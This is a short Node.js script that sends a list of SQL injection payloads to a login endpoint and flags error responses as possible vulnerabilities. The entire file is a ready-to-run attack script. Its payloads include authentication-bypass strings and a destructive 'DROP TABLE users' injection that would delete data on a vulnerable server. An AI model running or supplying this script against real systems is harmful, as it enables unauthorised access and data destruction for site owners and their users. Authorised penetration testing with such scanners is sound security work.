const fetch = require("node-fetch");

const target = "https://example.com/login"; // change to your endpoint

const payloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 'a'='a",
  "' UNION SELECT NULL--",
  "' OR ''='",
  "'; DROP TABLE users;--",
  "' OR 1=1#",
  "' OR 1=1/*",
];

async function testPayload(payload) {
  try {
    const res = await fetch(target, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: payload,
        password: "test"
      })
    });

    const text = await res.text();

    if (text.toLowerCase().includes("sql") ||
        text.toLowerCase().includes("syntax") ||
        res.status === 500) {
      console.log(`[!] Possible vulnerability with payload: ${payload}`);
    } else {
      console.log(`[OK] ${payload}`);
    }

  } catch (err) {
    console.error("Error:", err);
  }
}

async function run() {
  for (const payload of payloads) {
    await testPayload(payload);
  }
}

run();